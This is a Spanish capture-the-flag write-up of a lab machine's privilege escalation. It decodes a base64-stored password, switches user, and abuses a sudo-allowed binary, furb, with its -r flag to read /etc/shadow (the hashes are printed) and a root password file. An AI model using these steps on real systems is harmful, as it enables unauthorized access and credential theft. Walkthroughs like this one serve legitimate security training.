###### Usuario `[ www-data ]`:
Tenemos un archivo del usuario **bambi** el cual reviasmos que tipo de contenido:
```bash
bambi:c3VwZXJzZWNyZXRwYXNzd29yZDEyMw
```

Revisando el tipo de hash nos retorna esto: - Es un **falso positivo** porque en realidad es texto plano codificado, no un hash.
```bash
hashid c3VwZXJzZWNyZXRwYXNzd29yZDEyMw
Analyzing 'c3VwZXJzZWNyZXRwYXNzd29yZDEyMw'
[+] Juniper Netscreen/SSG(ScreenOS)
```

Asi que procedemos a decodificarlo:
```bash
echo "c3VwZXJzZWNyZXRwYXNzd29yZDEyMw" | base64 -d
```

Tenemos la contrasena del usuario **bambi**
```bash
supersecretpassword123
```

Migramos a este usuario:
```bash
# Comando para escalar al usuario: ( bambi )
su bambi # ( supersecretpassword123 )
```

###### Usuario `[ bambi ]`:
Listando sus permisos de usuario:
```bash
sudo -l

User bambi may run the following commands on a46ca3e7ea1a:
    (ALL : ALL) NOPASSWD: /usr/bin/furb # Tenemos una via potencial de migrar a root
```

Si ejecutamos el binario para ver como reacciona obtenemos lo siguiente:
```bash
sudo -u root /usr/bin/furb

furb version 1.0
Usage:
  furb --help        Show this help message
  furb --version     Show version information
  furb --list        List installed items
```

El binario `/usr/bin/furb` tiene una funcionalidad crítica que podemos explotar para escalar privilegios. Aquí está el análisis y la explotación
Esto indica que el sistema utiliza **módulos cargables**. La clave es que estos módulos probablemente son binarios/scripts que se ejecutan con privilegios de root cuando se invoca `furb`.

Revisando cadenas legibles para este binario:
```bash
strings /usr/bin/furb
```

Tenemos la siguiente:
```bash
Error: Missing file argument for -r
```

Al parecer requierre esta argumento, Intentando probar el argumento.
```bash
sudo -u root /usr/bin/furb -r /etc/shadow
```

Somos capaces de ver contenido privilegiado:
```bash
root:$y$j9T$djr/6OzFs5YQBGkXwyusg0$OJCmQMUtPM.g1Jw/6wVW9ZSEgHfnZq5EW6mPRygleO/:20249:0:99999:7:::
daemon:*:20237:0:99999:7:::
bin:*:20237:0:99999:7:::
sys:*:20237:0:99999:7:::
sync:*:20237:0:99999:7:::
games:*:20237:0:99999:7:::
man:*:20237:0:99999:7:::
lp:*:20237:0:99999:7:::
mail:*:20237:0:99999:7:::
news:*:20237:0:99999:7:::
uucp:*:20237:0:99999:7:::
proxy:*:20237:0:99999:7:::
www-data:*:20237:0:99999:7:::
backup:*:20237:0:99999:7:::
list:*:20237:0:99999:7:::
irc:*:20237:0:99999:7:::
_apt:*:20237:0:99999:7:::
nobody:*:20237:0:99999:7:::
bambi:$y$j9T$r/nmv1Fl0wMa/zmw2HmP91$DEcAUEemN/paeO/sO0nMG05p6YvjKLcVpbTV3qvRC1D:20249:0:99999:7:::
```

Buscando por archivos del sistema bajo el nombre del binario obtuvimos lo siguiente:
```bash
find / -iname "furb*" 2>/dev/null

/usr/bin/furb
/var/backups/furbRead.txt
```

Vemos su contenido:
```bash
cat /var/backups/furbRead.txt
Interesante este nombre de archivo, donde mas puede encontrarse?
```

filtrando por archivos no obtuvimos nada, Solo queda revisar el directorio para **root** para ello nos aprovecharemos del binario para leer su contenido:
Usamos el mismo nombre para ver si existe
```bash
sudo -u root /usr/bin/furb -r /root/furbRead.txt
```

Tenemos una contrasena que probaremos para **root**
```bash
StrongPasswordRootSuperSecret123
```

---
## Evidencia de Compromiso
Flags:
```bash
-rw-r--r--  1 root root   33 Jun 10 11:29 furbRead.txt
-rw-r--r--  1 root root   33 Jun 10 11:11 root.txt
```

```bash
# Captura de pantalla o output final
root@b976df2715f0:~# whoami
root
```

---